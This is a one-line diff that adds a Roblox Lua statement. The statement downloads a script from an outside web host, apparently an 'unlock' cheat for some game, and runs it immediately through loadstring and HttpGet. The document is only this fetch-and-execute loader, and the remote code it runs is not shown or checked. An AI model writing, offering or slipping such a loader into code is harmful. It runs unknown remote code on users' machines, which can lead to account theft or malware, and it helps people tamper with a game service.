@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://institutionapi.vercel.app/get-script?id=146f2b39-cc94-4106-a9bb-9a039986b372&name=twdunlock",true))()
